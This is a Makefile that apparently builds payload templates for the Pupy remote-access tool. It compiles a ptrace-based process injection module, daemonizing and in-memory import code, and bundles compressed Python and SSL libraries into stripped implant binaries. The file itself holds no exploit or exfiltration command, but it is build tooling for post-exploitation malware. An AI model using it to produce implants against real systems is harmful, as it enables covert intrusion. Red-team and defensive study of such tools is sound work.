CC ?= gcc

CFLAGS := $(shell pkg-config --cflags python-2.7) -I../lzma -fPIC $(CFLAGS_EXTRA) -pipe -Wall
LDFLAGS := -lpthread -ldl -fPIC $(LDFLAGS_EXTRA) -Wl,-Bstatic -lz -Wl,-Bdynamic
PFLAGS := -OO
PIE ?= -pie

LIBPYTHON ?= $(shell /sbin/ldconfig -p  | awk '/libpython2.7.so/{print $$4}' | head -n 1)
LIBCRYPTO ?= $(shell /sbin/ldconfig -p  | awk '/libcrypto.so.1.0.0/{print $$4}' | head -n 1)
LIBSSL ?= $(shell /sbin/ldconfig -p  | awk '/libssl.so.1.0.0/{print $$4}' | head -n 1)

XZARGS ?= "aligned(0x1000)" 'section(".xzrodata")'

ARCH ?= $(shell file $(LIBPYTHON) | grep 32-bit >/dev/null && echo 32 || echo 64)
ifeq ($(ARCH),64)
NAME := 64
else
NAME := 86
endif

LINUX_INJECT_CFLAGS := -include fixes.h -include debug.h \
	-Dmain=linux_inject_main -Drealpath=fakepath

ifneq ($(DEBUG),)
DEBUG_ADD := -debug
CFLAGS += -DDEBUG -O0 -g
NAME   := "$(NAME)d"
else
CFLAGS += -Os
LINUX_INJECT_CFLAGS += -Dprintf=dprint -Dfprintf=dfprint
LDFLAGS += -O1 -Wl,-s -Wl,-x -Wl,--gc-sections -Wl,--no-undefined
LDFLAGS += -Wl,-z,now -Wl,-z,combreloc -Wl,--enable-new-dtags
endif

PYTHON ?= python
TEMPLATE_OUTPUT_PATH ?= ../../pupy/payload_templates/

PYOBJS := _memimporter.o Python-dynload.o pupy_load.o pupy.o
COMMON_OBJS := list.o tmplibrary.o daemonize.o decompress.o LzmaDec.o

ifeq ($(ARCH),64)
COMMON_OBJS += linux-inject/inject-x86_64.o
else
COMMON_OBJS += linux-inject/inject-x86.o
endif

COMMON_OBJS += linux-inject/ptrace.o
COMMON_OBJS += linux-inject/utils.o

all: $(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).lin $(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).so

pupy.o: resources_library_compressed_string_txt.c
pupy_load.o: resources_bootloader_pyc.c resources_python27_so.c \
	resources_libssl_so.c resources_libcrypto_so.c

import-tab.c import-tab.h: mktab.py
	$(PYTHON) $(PFLAGS) $<

Python-dynload.o: Python-dynload.c import-tab.c import-tab.h
	$(CC) -c -o $@ $< $(CFLAGS)

LzmaDec.o: ../lzma/LzmaDec.c
	$(CC) -O3 -fPIC -c -o $@ $<

resources/library_compressed_string.txt: ../gen_library_compressed_string.py resources/library.zip
	$(PYTHON) $(PFLAGS) ../gen_library_compressed_string.py

resources_library_compressed_string_txt.c: ../gen_resource_header.py resources/library_compressed_string.txt resources/library.zip
	$(PYTHON) $(PFLAGS) ../gen_resource_header.py \
		resources/library_compressed_string.txt $(XZARGS)

resources/bootloader.pyc: ../gen_python_bootloader.py ../../pupy/packages/all/pupyimporter.py ../../pupy/pp.py
	$(PYTHON) $(PFLAGS) ../gen_python_bootloader.py $(DEBUG_ADD)

resources_bootloader_pyc.c: ../gen_resource_header.py resources/bootloader.pyc
	$(PYTHON) $(PFLAGS) $+ $(XZARGS)

linux-inject/%.o: linux-inject/%.c
	$(CC) -c $(LINUX_INJECT_CFLAGS) $(CFLAGS) -o $@ $<

resources/python27.so: $(LIBPYTHON)
	cp -vf $< $@.tmp
	-chmod 600 $@.tmp
	-strip $@.tmp
	mv $@.tmp $@
	rm -f $@.tmp

resources/libcrypto.so: $(LIBCRYPTO)
	cp -vf $< $@.tmp
	-chmod 600 $@.tmp
	-strip $@.tmp
	mv $@.tmp $@
	rm -f $@.tmp

resources/libssl.so: $(LIBSSL)
	cp -vf $< $@.tmp
	-chmod 600 $@.tmp
	-strip $@.tmp
	mv $@.tmp $@
	rm -f $@.tmp

resources/library.zip: ../build_library_zip.py ../additional_imports.py
	$(PYTHON) -OO $(PFLAGS) $<

resources_python27_so.c: ../gen_resource_header.py resources/python27.so
	$(PYTHON) $(PFLAGS) $+ $(XZARGS)

resources_libssl_so.c: ../gen_resource_header.py resources/libssl.so
	$(PYTHON) $(PFLAGS) $+ $(XZARGS)

resources_libcrypto_so.c: ../gen_resource_header.py resources/libcrypto.so
	$(PYTHON) $(PFLAGS) $+ $(XZARGS)

$(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).lin: main_exe.o $(PYOBJS) $(COMMON_OBJS)
	$(CC) $(PIE) $+ -o $@ $(LDFLAGS)

$(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).so: main_so.o $(PYOBJS) $(COMMON_OBJS)
	$(CC) -shared $+ -o $@ $(LDFLAGS) -Wl,-soname,pupyx$(NAME).so

.PHONY: clean all

clean:
	rm -f $(COMMON_OBJS)
	rm -f pupy pupy.so
	rm -f *.o
	rm -f linux-inject/*.o
	rm -f resources/library.zip
	rm -f resources/*.so
	rm -f resources/*.txt
	rm -f resources_*.c
	rm -f import-tab.c
	rm -f import-tab.h

$(COMMON_OBJS) $(PYOBJS): import-tab.h

